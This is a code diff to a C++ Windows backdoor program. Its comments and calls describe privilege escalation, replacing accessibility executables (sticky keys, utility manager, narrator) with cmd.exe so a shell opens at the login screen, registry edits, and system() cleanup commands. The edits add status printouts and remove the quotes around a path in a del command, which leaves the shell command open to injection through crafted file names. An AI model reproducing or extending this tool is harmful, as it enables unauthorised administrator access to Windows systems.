@@ -60,7 +60,8 @@ void cleanup() {
 
     //deletes backdoor executables (cmd.exe replacements)
     for (const std::string& backdoor : backdoorList) {
-        std::string delCommand = "del \"" + backdoor + "\"";
+        std::string delCommand = "del " + backdoor;
+        std::cout << delCommand << std::endl;
         system(delCommand.c_str());
     }    
 
@@ -68,7 +69,8 @@ void cleanup() {
     for (const std::string& executable : replacedExecutables) {
         std::string original = executable;
         original.replace(executable.find("old-"), 4, "");
-        std::string renameCommand = "rename \"" + executable + "\" \"" + original + "\"";
+        std::string renameCommand = "move \"" + executable + "\" \"" + original + "\"";
+        std::cout << renameCommand << std::endl;
         system(renameCommand.c_str());
     }
 }
@@ -120,15 +122,18 @@ void snipping_tool() {
 
 int main(){
     //grants administrator permissions to all backdoor executables
+    std::cout << "Gaining Permissions..." << std::endl;
     priv_esc();
 
     //enables all windows hotkeys on the system
     system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f");
 
     //cleans up previous runs beforehand
+    std::cout << "Cleaning Up..." << std::endl;
     cleanup();
 
     //executes backdoors
+    std::cout << "Executing Backdoors..." << std::endl;
     sticky_keys();
     utility_manager();
     narrator();
